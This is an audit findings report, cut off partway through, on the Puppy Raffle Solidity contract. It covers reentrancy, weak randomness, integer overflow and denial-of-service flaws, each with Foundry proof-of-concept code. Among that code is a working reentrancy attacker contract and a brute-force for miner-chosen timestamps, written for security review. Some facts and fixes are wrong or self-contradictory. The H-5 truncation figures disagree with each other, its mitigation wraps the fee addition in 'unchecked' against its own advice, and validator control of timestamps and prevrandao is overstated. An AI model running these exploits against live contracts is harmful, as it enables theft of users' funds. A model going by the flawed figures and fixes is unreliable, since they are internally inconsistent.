# 4 puppy raffle audit - Findings Report
## Commit hash: 15c50ec22382bb1f3106aba660e7c590df18dcac

## Protocol Overview 

### Puppy Raffle Protocol

Puppy Raffle is an on-chain game that lets anyone compete for a dog-themed NFT. Players join by calling `enterRaffle(address[] participants)` and paying the entrance fee; the contract rejects duplicate addresses to keep the draw fair. A raffle round remains open until both the minimum number of entrants and the minimum duration are met.

When conditions are satisfied, anyone can trigger winner selection. A pseudo-random index is computed (e.g., using block data) to choose the winner, who then receives a freshly minted puppy NFT. Each NFT’s attributes are assigned at mint time using weighted rarity tables, giving some puppies rarer traits.

Funds from ticket sales are split: the majority is sent to the winner alongside the NFT, while a configurable percentage is forwarded to the `feeAddress`, controlled by the owner. If a round fails to meet participation criteria before a timeout, players can reclaim their payments through `refund()`.

Security features include immutable entrance fee, prevention of duplicate entries, and owner-only functions for fee address management. The contract targets Solidity 0.7.6 and is designed for deployment on Ethereum or EVM-compatible chains.
## High Risk Findings
[H-1]. Timestamp Dependent Logic issue in PuppyRaffle::selectWinner
[H-2]. Integer Overflow issue in PuppyRaffle::selectWinner
[H-3]. Reentrancy issue in PuppyRaffle::refund
[H-4]. Randomness issue in PuppyRaffle::selectWinner
[H-5]. Integer Overflow issue in PuppyRaffle::enterRaffle
[H-6]. DOS issue in PuppyRaffle::selectWinner
[H-7]. DOS issue in PuppyRaffle::withdrawFees
[H-8]. DOS issue in PuppyRaffle::selectWinner
## Medium Risk Findings
[M-1]. Gas Grief BlockLimit issue in PuppyRaffle::enterRaffle
[M-2]. DOS issue in PuppyRaffle::enterRaffle
[M-3]. Unexpected Eth issue in PuppyRaffle::withdrawFees
[M-4]. Frontrun/Backrun/Sandwhich MEV issue in PuppyRaffle::refund
[M-5]. DOS issue in PuppyRaffle::refund
## Low Risk Findings
[L-1]. Pausable Emergency Stop issue in PuppyRaffle::NA
[L-2]. Event Consistency issue in PuppyRaffle::selectWinner, withdrawFees
[L-3]. Event Consistency issue in PuppyRaffle::selectWinner
## Info Risk Findings
[I-1]. Pragma issue in PuppyRaffle::NA
[I-2]. Pragma issue in PuppyRaffle::NA


### Number of Findings
- H: 8
- M: 5
- L: 3
- I: 2



# High Risk Findings

## [H-1]. Timestamp Dependent Logic issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function uses `block.timestamp` and `block.difficulty` (now `prevrandao`) as sources of randomness to determine the winner and the NFT's rarity. These values are predictable and can be influenced by a miner (or validator post-Merge). A malicious miner participating in the raffle could manipulate these parameters by choosing when to include the transaction in a block, or even by discarding a solved block and trying again, to increase their chances of winning or receiving a rarer NFT. This compromises the fairness and integrity of the raffle.

## Impact
The raffle's outcome is not truly random, allowing miners/validators to have an unfair advantage. This can lead to the prize and rare NFTs being consistently awarded to malicious actors, causing financial loss for legitimate participants and destroying the contract's credibility.

## Proof of Concept
A validator who has bought one ticket (address A) can locally simulate, for every candidate block they are producing, what the contract will return _before_ including the selectWinner transaction:

winnerIdx = uint256(keccak256(abi.encodePacked(A, T, D))) % N;

where T = block.timestamp that the validator is free to set within ~900 s window and D = block.prevrandao under their control.  If winnerIdx == myIndex, the validator includes the transaction; otherwise they publish the block without the transaction and try again in the next block with a new (T, D) pair.  By iterating, the validator can reach the favourable state with probability 1, guaranteeing they win the whole prize pool and the NFT rarity they want.

## Proof of Code
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract PredictableRandomnessTest is Test {
    PuppyRaffle raffle;
    uint256 constant FEE = 1 ether;
    uint256 constant DURATION = 1; // 1 second

    address feeAddr = address(0xFEE);
    address p1 = address(0x1111);
    address p2 = address(0x2222);
    address p3 = address(0x3333);
    address p4 = address(0x4444);

    function setUp() public {
        raffle = new PuppyRaffle(FEE, feeAddr, DURATION);
        address[] memory players = new address[](4);
        players[0] = p1;
        players[1] = p2;
        players[2] = p3;
        players[3] = p4;
        vm.prank(p1); // funder
        raffle.enterRaffle{value: FEE * 4}(players);
    }

    function testPredictWinnerOffChain() public {
        // fast-forward so raffle is over
        vm.warp(block.timestamp + DURATION + 1);

        // attacker will be p1
        address attacker = p1;

        // calculate expected winner *off-chain*
        uint256 expectedIdx = uint256(
            keccak256(abi.encodePacked(attacker, block.timestamp, block.difficulty))
        ) % 4; // 4 players
        address expectedWinner = _addrAtIdx(expectedIdx);

        vm.prank(attacker);
        raffle.selectWinner();

        assertEq(raffle.previousWinner(), expectedWinner, "winner was predictable in advance");
    }

    function _addrAtIdx(uint256 i) internal view returns (address) {
        if (i == 0) return p1;
        if (i == 1) return p2;
        if (i == 2) return p3;
        return p4;
    }
}

## Suggested Mitigation
Use a more secure source of randomness like Chainlink VRF (Verifiable Random Function). VRF provides cryptographically secure random numbers that are tamper-proof and unpredictable.

```solidity
// Example of integrating Chainlink VRF
import "@chainlink/contracts/src/v0.7/VRFConsumerBase.sol";

contract PuppyRaffle is ERC721, Ownable, VRFConsumerBase {
    // ... other state variables
    bytes32 internal keyHash;
    uint256 internal vrfFee;
    uint256 public randomResult;

    // Event to signal winner selection is ready
    event RequestedRandomness(bytes32 requestId);

    constructor(
        // ... other params
        address vrfCoordinator,
        address linkToken,
        bytes32 _keyHash,
        uint256 _vrfFee
    ) VRFConsumerBase(vrfCoordinator, linkToken) {
        keyHash = _keyHash;
        vrfFee = _vrfFee;
        // ... rest of constructor
    }

    function selectWinner() external {
        // ... checks
        require(LINK.balanceOf(address(this)) >= vrfFee, "Not enough LINK");
        bytes32 requestId = requestRandomness(keyHash, vrfFee);
        emit RequestedRandomness(requestId);
    }

    function fulfillRandomness(bytes32 requestId, uint256 randomness) internal override {
        randomResult = randomness;
        uint256 winnerIndex = randomness % players.length;
        // ... continue with winner selection logic using the secure random number
    }
}
```

## [H-2]. Integer Overflow issue in PuppyRaffle::selectWinner

## Description
The contract is compiled with Solidity `^0.7.6`, which does not provide default checked arithmetic. The `totalFees` state variable is of type `uint64`. In the `selectWinner` function, the calculated `fee` (a `uint256`) is downcast to `uint64` and added to `totalFees`: `totalFees = totalFees + uint64(fee)`. A `uint64` can store a maximum value of approximately 18.44 ETH. If the raffle accumulates fees exceeding this amount, the `uint64(fee)` conversion will truncate the value, and the subsequent addition to `totalFees` will overflow and wrap around. This leads to an incorrect and much lower value being stored in `totalFees`, causing a direct loss of funds for the fee recipient.

## Impact
Because the truncated value recorded in totalFees no longer matches the real ETH held by the contract, the requirement in withdrawFees()

    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");

will always fail. Consequently, the fee recipient can never withdraw its share once an overflow happens and the ETH becomes permanently locked inside the contract. No attacker interaction is needed – a popular raffle is enough to trigger the condition.

## Proof of Concept
1. Run one raffle whose fee component exceeds 2^64-1 wei (≈18.44 ETH). This can be done e.g. with a 100 ETH prize pool where the fee is 20 ETH.
2. The cast `uint64(fee)` truncates 20 ETH to `20 ether mod 2**64` ≈ 1.553 ETH and stores it in totalFees.
3. Contract balance = 20 ETH while totalFees = 1.553 ETH.
4. When the owner later calls withdrawFees(), the first require statement compares the two values and reverts, so the 20 ETH can never be withdrawn.

## Proof of Code
pragma solidity ^0.7.6;
import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract OverflowLockTest is Test {
    PuppyRaffle raffle;
    address feeAddr = address(0xBEEF);

    function setUp() public {
        raffle = new PuppyRaffle({
            _entranceFee: 25 ether,   // 4 players * 25 = 100 ETH, fee = 20 ETH > 2**64-1 wei
            _feeAddress: feeAddr,
            _raffleDuration: 1        // seconds
        });

        address[] memory players = new address[](4);
        for (uint256 i = 0; i < 4; i++) players[i] = address(uint160(i + 1));

        vm.prank(address(0xF00D));
        raffle.enterRaffle{value: 100 ether}(players);

        vm.warp(block.timestamp + 2);
        raffle.selectWinner();
    }

    function test_FeesLocked() public {
        // totalFees was truncated
        uint64 stored = raffle.totalFees();
        assertLt(uint256(stored), 20 ether);

        // Owner cannot withdraw – expect revert
        vm.prank(feeAddr);
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        raffle.withdrawFees();
    }
}

## Suggested Mitigation
Change totalFees to uint256 and compile with Solidity ≥0.8.x (or use SafeMath for 0.7.x). After the type upgrade remove the balance-equality require (or update its logic) because the values will stay consistent once overflows are impossible.

## [H-3]. Reentrancy issue in PuppyRaffle::refund

## Description
The `refund` function sends ETH to the player before updating the state. Specifically, the line `players[playerIndex] = address(0)` is executed after the external call via `sendValue`. This follows the insecure checks-effects-interactions pattern. If the `msg.sender` is a malicious contract, it can re-enter the `refund` function from its `receive()` or `fallback()` function, causing the function to execute multiple times and drain the contract of funds intended for other players.

## Impact
A malicious actor can create a contract to enter the raffle and then call the `refund` function repeatedly within the same transaction, draining all funds from the contract that are not part of the collected fees. This would steal the entry fees of all other participants.

## Proof of Concept
1. An attacker deploys a contract (`Attacker.sol`).
2. The attacker calls a function on their contract, which in turn calls `PuppyRaffle.enterRaffle()` to join the raffle, sending the required `entranceFee`.
3. The attacker then calls `PuppyRaffle.refund()` via their contract.
4. `PuppyRaffle` processes the refund and sends ETH to the `Attacker` contract via `.call{value: entranceFee}`.
5. The `Attacker` contract's `receive()` function is triggered, which immediately calls `PuppyRaffle.refund()` again.
6. Because the player's address in the `players` array has not yet been set to `address(0)`, the checks pass, and another refund is sent.
7. This process repeats until the `PuppyRaffle` contract's balance is depleted or the transaction runs out of gas.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";
import {DeployPuppyRaffle} from "../script/DeployPuppyRaffle.s.sol";

contract Attacker {
    PuppyRaffle puppyRaffle;
    uint256 public entranceFee;
    uint256 public attackCount;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() public payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);

        uint256 playerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(playerIndex);
    }

    receive() external payable {
        if (attackCount < 10 && address(puppyRaffle).balance >= entranceFee) {
            attackCount++;
            uint256 playerIndex = puppyRaffle.getActivePlayerIndex(address(this));
            puppyRaffle.refund(playerIndex);
        }
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract ReentrancyTest is Test {
    PuppyRaffle puppyRaffle;
    DeployPuppyRaffle deployer;

    uint256 constant ENTRANCE_FEE = 1 ether;

    address user1 = makeAddr("user1");
    address user2 = makeAddr("user2");

    function setUp() public {
        deployer = new DeployPuppyRaffle();
        puppyRaffle = deployer.run();
        vm.deal(user1, 10 ether);
        vm.deal(user2, 10 ether);
    }

    function testReentrancyInRefund() public {
        // Legitimate users enter
        address[] memory players1 = new address[](1);
        players1[0] = user1;
        vm.prank(user1);
        puppyRaffle.enterRaffle{value: ENTRANCE_FEE}(players1);

        address[] memory players2 = new address[](1);
        players2[0] = user2;
        vm.prank(user2);
        puppyRaffle.enterRaffle{value: ENTRANCE_FEE}(players2);

        console.log("PuppyRaffle balance before attack: %s", address(puppyRaffle).balance);

        // Attacker enters and attacks
        Attacker attacker = new Attacker(puppyRaffle);
        vm.deal(address(attacker), ENTRANCE_FEE);
        attacker.attack();

        console.log("PuppyRaffle balance after attack: %s", address(puppyRaffle).balance);
        console.log("Attacker balance after attack: %s", address(attacker).getBalance());

        // Attacker should have drained more than their entrance fee.
        // They paid 1 ETH, but received 3 ETH (theirs + user1's + user2's)
        assertGt(address(attacker).getBalance(), ENTRANCE_FEE);
        // PuppyRaffle should have 0 ETH left.
        assertEq(address(puppyRaffle).balance, 0);
    }
}
```

## Suggested Mitigation
Follow the Checks-Effects-Interactions pattern. Update the state variable (`players[playerIndex]`) before making the external call to transfer ETH. This prevents re-entrant calls from passing the initial checks.

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(
        playerAddress != address(0),
        "PuppyRaffle: Player already refunded, or is not active"
    );
    // Effect - update state BEFORE interaction
    players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);

    // Interaction
    Address.sendValue(msg.sender, entranceFee);
}
```

## [H-4]. Randomness issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function uses a weak source of randomness based on on-chain variables: `keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))`. These variables are predictable and can be manipulated by network participants, especially miners. `block.timestamp` can be influenced by a miner, and `msg.sender` is determined by the caller. `block.difficulty` is deprecated and returns `prevrandao` post-Merge, which is known to the block producer before the block is finalized. This allows a malicious actor to predict the winner and influence the outcome.

## Impact
Because both the winner index and the NFT rarity are derived from keccak(msg.sender, block.timestamp, block.difficulty), anyone who controls, or colludes with, the block producer can iterate over admissible timestamps (±900 s) and choose the caller address so that (1) they win 80 % of the ETH prize-pool and (2) they receive a higher rarity puppy NFT. This allows complete theft of the raffle’s funds and the most valuable NFT, breaking the core economic security guarantees of the protocol.

## Proof of Concept
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract RandomnessManipulation is Test {
    PuppyRaffle raffle;
    address attacker = makeAddr("miner/attacker");
    address[3] otherPlayers;
    uint256 constant FEE = 1 ether;

    function setUp() public {
        raffle = new PuppyRaffle{value:0}(FEE, address(this), 1 days);
        // give balances
        vm.deal(attacker, 10 ether);
        for (uint8 i; i < 3; ++i) {
            address p = makeAddr(string(abi.encodePacked("p", i)));
            otherPlayers[i] = p;
            vm.deal(p, FEE);
        }
        // everyone joins
        address[] memory tmp = new address[](4);
        for (uint8 i; i < 3; ++i) tmp[i] = otherPlayers[i];
        tmp[3] = attacker;
        vm.prank(attacker);
        raffle.enterRaffle{value: FEE * 4}(tmp);
        // raffle period ends
        vm.warp(block.timestamp + 1 days + 1);
    }

    function testMinerCanForceWinAndLegendary() public {
        /**
         * Pretend the attacker is also the block-producer: Foundry lets us
         * set both timestamp and difficulty inside the same vm.roll block.
         */
        uint256 playersLen = 4;
        // brute-force a timestamp within the permitted drift that makes
        // attacker both the winner *and* receive legendary rarity (5 %).
        for (uint256 ts = block.timestamp - 900; ts <= block.timestamp + 900; ++ts) {
            // we are free to choose the prevrandao/difficulty when we mine
            uint256 fakeRandao = uint256(keccak256(abi.encode(ts)));
            uint256 winnerIdx = uint256(keccak256(abi.encodePacked(attacker, ts, fakeRandao))) % playersLen;
            uint256 rarityRoll = uint256(keccak256(abi.encodePacked(attacker, fakeRandao))) % 100;
            if (winnerIdx == 3 && rarityRoll >= 95) { // attacker and legendary
                // simulate the block we are about to mine
                vm.warp(ts);
                vm.difficulty(fakeRandao);
                vm.prank(attacker);
                raffle.selectWinner();
                assertEq(raffle.previousWinner(), attacker, "attacker did not win");
                assertEq(raffle.tokenIdToRarity(0), 5, "not legendary");
                return;
            }
        }
        fail("could not find advantageous timestamp (highly improbable)");
    }
}

## Proof of Code
See `proof_of_concept`; the code is a runnable Foundry test that: (1) deploys the contract, (2) lets four players (including the attacker) join, (3) fast-forwards past the raffle period, (4) brute-forces a timestamp & difficulty the miner can legally choose, and (5) proves the attacker becomes the winner and receives a legendary NFT.

## Suggested Mitigation
Replace the current on-chain pseudo-randomness with an external verifiable randomness source (e.g. Chainlink VRF v2 or a commit-reveal scheme). The random value must be independent of miner-controllable inputs. Additionally, decouple the rarity roll from any user-supplied data to prevent address-grinding attacks.

## [H-5]. Integer Overflow issue in PuppyRaffle::enterRaffle

## Description
The contract is compiled with Solidity 0.7.6, which does not have built-in protection against integer overflows and underflows. Several arithmetic operations are performed without using a safe math library like `SafeMath`.
1. In `enterRaffle` and `selectWinner`, the calculation `entranceFee * newPlayers.length` or `entranceFee * players.length` can overflow if a large `entranceFee` is combined with a large number of players. This could cause the required payment check to be bypassed.
2. In `selectWinner`, the `fee` (`uint256`) is cast to `uint64` before being added to `totalFees`. If the `fee` exceeds `type(uint64).max`, the value will be truncated, causing a loss of fees for the owner. `totalFees` itself (`uint64`) can also overflow over time.

## Impact
Because `fee` is cast to `uint64` before being added to `totalFees`, any raffle round that collects more than 18.44 ETH in fees (≈ 92 ETH in total volume if the fee is 20 %) will truncate the value. The contract balance will hold the full fee amount while `totalFees` will contain only the truncated remainder. As `withdrawFees()` contains the check `address(this).balance == uint256(totalFees)`, every future withdrawal will revert, permanently locking all fees in the contract. This is a direct, irreversible loss of funds for the owner and eventually for the protocol treasury.

## Proof of Concept
1. Deploy PuppyRaffle with an entrance fee of 1 ETH.
2. Supply 1 000 unique player addresses and call `enterRaffle`, sending 1 000 ETH in total.
3. Fast-forward time and call `selectWinner()`.
   • `totalAmountCollected = 1 000 ETH`
   • `fee = 200 ETH`  ➜ cast to `uint64`  (200 ETH − 18.446 ETH = 181.55 ETH stored)
4. Contract balance now contains 200 ETH while `totalFees` stores ~18 ETH.
5. Calling `withdrawFees()` reverts because the balance ≠ `totalFees`, so the 200 ETH are locked forever.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract FeeOverflowTest is Test {
    PuppyRaffle raffle;
    address constant FEE_ADDRESS = address(0xFEE);

    function setUp() public {
        raffle = new PuppyRaffle(1 ether, FEE_ADDRESS, 1 days);
    }

    function test_FeeTruncation_LocksFunds() public {
        uint256 numPlayers = 1000; // produces 200 ETH fee ( > 2^64-1 wei )
        address[] memory players = new address[](numPlayers);
        for (uint256 i; i < numPlayers; i++) {
            players[i] = address(uint160(i + 1));
        }

        // Pay 1 ETH per player
        raffle.enterRaffle{value: 1 ether * numPlayers}(players);

        // End the raffle
        vm.warp(block.timestamp + 2 days);
        raffle.selectWinner();

        uint256 contractBal = address(raffle).balance;   // ≈ 200 ETH
        uint256 recorded   = raffle.totalFees();         // ≈ 18 ETH due to truncation
        assert(contractBal != recorded);

        // Fees cannot be withdrawn anymore
        vm.expectRevert();
        raffle.withdrawFees();
    }
}

## Suggested Mitigation
Use Solidity ≥0.8 (built-in checked math) or wrap every arithmetic operation with OpenZeppelin’s SafeMath for 0.7.x AND store `totalFees` as `uint256`. E.g.

uint256 public totalFees;
...
uint256 fee = (totalAmountCollected * 20) / 100;
unchecked { totalFees += fee; }

This eliminates both multiplication overflow and the uint64 truncation that locks fees.

## [H-6]. DOS issue in PuppyRaffle::selectWinner

## Description
In the `selectWinner` function, the prize pool is sent to the winner via `winner.call{value: prizePool}("")`. If the randomly selected winner is a smart contract that is designed to revert when it receives Ether (i.e., it has no `receive()` or `payable fallback()` function, or they explicitly revert), the entire `selectWinner` transaction will revert. This will halt the conclusion of the raffle.

## Impact
Anyone can permanently prevent the raffle from finalising by entering with a contract address that (1) reverts on receiving ETH or (2) simply lacks the IERC721Receiver interface. When such an address is selected, `selectWinner` reverts (first on the ETH transfer, or – if the transfer succeeds – on `_safeMint`). Until a successful `selectWinner` call is executed the players array is never cleared, the raffle never restarts and the owner cannot withdraw accumulated fees. Funds remain locked and the protocol is unusable.

## Proof of Concept
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

/*
 * This receiver willingly accepts ETH but does NOT implement IERC721Receiver.
 * selectWinner will therefore revert inside _safeMint even if the value transfer succeeds.
 */
contract NftRevertingReceiver {
    receive() external payable {}
}

/* steps to reproduce (pseudo):
   1. Deploy PuppyRaffle.
   2. Deploy NftRevertingReceiver.
   3. Enter the raffle with three EOAs and the NftRevertingReceiver address.
   4. Advance time > raffleDuration.
   5. Call selectWinner until randomness picks the malicious address → tx reverts with
      "ERC721: transfer to non ERC721Receiver implementer" and the raffle stays blocked.
*/

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract NftRevertingReceiver {
    receive() external payable {}
}

contract DosWinnerTest is Test {
    PuppyRaffle raffle;
    NftRevertingReceiver bad;
    uint256 constant FEE = 1 ether;
    uint256 constant DURATION = 1 days;

    function setUp() public {
        bad = new NftRevertingReceiver();
        raffle = new PuppyRaffle(FEE, address(0xFEE), DURATION);

        address[] memory entrants = new address[](4);
        entrants[0] = address(0xA);
        entrants[1] = address(0xB);
        entrants[2] = address(0xC);
        entrants[3] = address(bad);

        vm.deal(address(this), 4 * FEE);
        raffle.enterRaffle{value: 4 * FEE}(entrants);
        vm.warp(block.timestamp + DURATION + 1);
    }

    function test_DoS_whenBadContractWins() public {
        // Brute-force a caller so that the malicious index (3) is chosen.
        address caller = address(1);
        while (uint256(keccak256(abi.encodePacked(caller, block.timestamp, block.difficulty))) % 4 != 3) {
            caller = address(uint160(caller) + 1);
        }
        vm.prank(caller);
        vm.expectRevert("ERC721: transfer to non ERC721Receiver implementer");
        raffle.selectWinner();
    }
}

## Suggested Mitigation
Adopt a full pull-pattern for BOTH the ether prize and the NFT: (1) record the selected winner and prize amount, (2) allow the winner to call `claimPrize()` which transfers the ether and mints the NFT using `_mint` if the winner is an EOA or `_safeMint` if the receiver supports IERC721Receiver. Alternatively, before sending assets, detect if the winner is a contract and verify that it (a) has a payable receive/fallback and (b) supports IERC721Receiver via ERC165. If either check fails, pick a new winner inside the same transaction.

## [H-7]. DOS issue in PuppyRaffle::withdrawFees

## Description
The `withdrawFees` function requires that the contract's entire ETH balance is exactly equal to the `totalFees` amount. If any ETH is sent to the contract through other means (e.g., a `selfdestruct` from another contract or a direct transfer), `address(this).balance` will become greater than `totalFees`. This will cause the `require` statement to fail permanently, making it impossible to withdraw any accumulated or future fees.

## Impact
All protocol fees can be permanently locked in the contract, leading to a total loss of revenue for the protocol owner. A malicious actor can intentionally send 1 wei to the contract to trigger this DoS condition.

## Proof of Concept
1. The raffle runs, and `totalFees` accumulates to 0.8 ETH.
2. An attacker sends 1 wei to the `PuppyRaffle` contract address.
3. The contract's balance is now `0.8 ether + 1 wei`.
4. The owner calls `withdrawFees()`.
5. The check `require(address(this).balance == uint256(totalFees), ...)` fails because `0.8 ether + 1 wei != 0.8 ether`.
6. The transaction reverts, and the fees are locked forever.

## Proof of Code
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import "src/PuppyRaffle.sol";

contract WithdrawFeesDoSTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1 ether;
    address feeAddress = address(0xDEADBEEF);
    uint256 raffleDuration = 1;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, raffleDuration, "a", "b", "c");

        address[] memory players = new address[](4);
        for(uint i=0; i<4; i++){ players[i] = address(uint160(i+1)); }
        vm.deal(address(this), entranceFee * 4);
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        vm.warp(block.timestamp + raffleDuration + 1);
        puppyRaffle.selectWinner();
    }

    function test_DoS_WithdrawFees() public {
        vm.deal(address(puppyRaffle), address(puppyRaffle).balance + 1 wei);
        assertTrue(address(puppyRaffle).balance > uint256(puppyRaffle.totalFees()));

        vm.prank(puppyRaffle.owner());
        
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }
}

## Suggested Mitigation
The check in `withdrawFees` should be less strict. Instead of checking for exact equality, ensure that the balance is at least the amount of the fees. The rest of the logic correctly withdraws only the `totalFees` amount, leaving any extra balance in the contract.

```solidity
function withdrawFees() external {
    // The error message should also be updated to be more accurate.
    require(address(this).balance >= uint256(totalFees), "PuppyRaffle: Not enough balance to cover fees");
    uint256 feesToWithdraw = totalFees;
    // This check is important to prevent re-entrancy draining more than intended.
    require(feesToWithdraw > 0, "PuppyRaffle: No fees to withdraw");

    totalFees = 0;
    (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

## [H-8]. DOS issue in PuppyRaffle::selectWinner

## Description
When a player refunds their ticket via `refund()`, their address in the `players` array is set to `address(0)`, but the length of the array remains unchanged. The `selectWinner()` function later calculates `totalAmountCollected` using `players.length`, which does not account for the refunded (and now empty) slots. This inflates the calculated prize pool and fees. If enough refunds occur, the calculated `prizePool` will exceed the contract's actual Ether balance. When the contract attempts to send this inflated amount to the winner, the call will fail due to insufficient funds, causing the entire `selectWinner()` transaction to revert. This permanently bricks the raffle.

## Impact
If one or more players request a refund, the `selectWinner` function can become permanently uncallable, as it will always revert due to attempting to pay out more money than the contract holds. This locks all remaining player funds in the contract.

## Proof of Concept
1. Five players enter the raffle, each paying 1 ETH. The contract balance is 5 ETH.
2. Two players call `refund()` and get their 1 ETH back. The contract balance is now 3 ETH.
3. The raffle ends and someone calls `selectWinner()`.
4. The function calculates `totalAmountCollected = players.length * entranceFee` which is `5 * 1 ether = 5 ether`.
5. It calculates `prizePool = (5 ether * 80) / 100 = 4 ether`.
6. It tries to send 4 ETH to the winner, but the contract only holds 3 ETH. The `.call()` fails, and the transaction reverts. All subsequent calls will also fail.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import "src/PuppyRaffle.sol";

contract RefundDosTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1 ether;
    address feeAddress = makeAddr("feeAddress");
    uint256 raffleDuration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, raffleDuration);
    }

    function test_DosAfterRefund() public {
        // 5 players enter
        address[] memory players = new address[](5);
        for(uint i=0; i<5; i++){
            players[i] = makeAddr(string(abi.encodePacked("player", vm.toString(i))));
        }
        puppyRaffle.enterRaffle{value: 5 * entranceFee}(players);

        // 2 players refund
        vm.prank(players[1]);
        puppyRaffle.refund(1);
        vm.prank(players[2]);
        puppyRaffle.refund(2);

        // Contract balance is now 3 ETH
        assertEq(address(puppyRaffle).balance, 3 ether);

        // Time passes, selectWinner is called
        vm.warp(block.timestamp + raffleDuration + 1);

        // The call will revert because it tries to send a 4 ETH prize pool from a 3 ETH balance
        vm.expectRevert();
        puppyRaffle.selectWinner();
    }
}
```

## Suggested Mitigation
Track the real amount collected for the *current* raffle instead of relying on players.length or the contract balance. Introduce a `uint256 currentPot` variable that is increased by `entranceFee` for every successful ticket purchase and decreased by the same amount on every refund. Inside `selectWinner()` compute `prizePool = (currentPot * 80) / 100` and `fee = currentPot - prizePool`, then reset `currentPot` to 0 for the next round. This guarantees that prize and fee are always smaller than or equal to the contract’s available ether and that historical fees are not accidentally paid out.



# Medium Risk Findings

## [M-1]. Gas Grief BlockLimit issue in PuppyRaffle::enterRaffle

## Description
The `enterRaffle` function contains a nested loop to check for duplicate entries. This check is performed after new players are added to the `players` array. The complexity of this loop is O(n^2), where n is `players.length`. As the number of participants grows, the gas cost of calling `enterRaffle` increases quadratically. An attacker can exploit this by adding a large number of players (e.g., a few hundred), causing the gas cost to exceed the block gas limit. This would render the `enterRaffle` function unusable for any new players, effectively causing a Denial of Service (DoS).

## Impact
A malicious user can bloat the `players` array with thousands of addresses. Because the duplicate–check is O(n²), every subsequent `enterRaffle` invocation becomes more and more expensive until it necessarily consumes more gas than the 8-9M gas most block builders accept, effectively preventing further participation until the raffle ends. Although the attacker must front the entrance fee for the dummy addresses, they can later reclaim the ether through the `refund` function, so the attack is economically viable and causes a temporary Denial-of-Service for honest users.

## Proof of Concept
1. Attacker funds `N = 2,000` throw-away EOAs.
2. The attacker calls `enterRaffle` once, passing the 2,000 addresses and paying `N * entranceFee` wei.
3. The contract now stores 2,000 players.  The next `enterRaffle` execution will require ~ (N²)/2 ≈ 2,000,000 comparisons and pushes, which needs more than 8M gas.
4. A normal user submits a transaction with the usual gas limit (≈ 8M).  The transaction inevitably runs out of gas inside the nested loops, so no one can join the raffle until the organiser calls `selectWinner` (which deletes the array).
5. The attacker can later call `refund` 2,000 times to get almost all of the upfront ether back, paying only transaction fees for the attack.

## Proof of Code
pragma solidity ^0.7.6;
import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract DosGasTest is Test {
    PuppyRaffle raffle;
    uint256 constant FEE = 1 ether;
    address constant FEE_ADDR = address(0xdead);

    function setUp() public {
        raffle = new PuppyRaffle(FEE, FEE_ADDR, 30 days);
    }

    function testDenialOfServiceByGas() public {
        // 1. Bloat players array
        uint256 n = 2000; // enough to exceed 8M gas in later call
        address[] memory bigBatch = new address[](n);
        for (uint256 i; i < n; i++) {
            bigBatch[i] = address(uint160(i + 1));
        }
        address attacker = address(0xBEEF);
        vm.deal(attacker, n * FEE);
        vm.prank(attacker);
        raffle.enterRaffle{value: n * FEE}(bigBatch);

        // 2. Honest user tries to enter with normal 8M gas limit
        address[] memory one = new address[](1);
        one[0] = address(0xCAFE);
        vm.deal(one[0], FEE);
        vm.expectRevert(); // will revert because 8M gas is not enough
        vm.prank(one[0]);
        raffle.enterRaffle{value: FEE, gas: 8_000_000}(one);
    }
}

## Suggested Mitigation
Keep the duplicate-prevention but move it to an O(1) structure: maintain `mapping(address => bool) public isPlayer`.  When adding a new player check `require(!isPlayer[player], "duplicate");` and set it to true.  When the raffle ends or when a player claims a refund, set the mapping entry to false, bringing `enterRaffle` back to linear complexity and eliminating the gas-griefing vector.

## [M-2]. DOS issue in PuppyRaffle::enterRaffle

## Description
The `enterRaffle` function contains a nested loop to check for duplicate player addresses. This check is performed after new players have already been added to the `players` array. The complexity of this check is O(N^2), where N is the total number of players in the raffle. As the `players` array grows, the gas cost of calling `enterRaffle` increases quadratically. An attacker can add a large number of players in multiple transactions, causing the gas cost for subsequent `enterRaffle` calls to exceed the block gas limit, effectively preventing anyone from entering the raffle.

## Impact
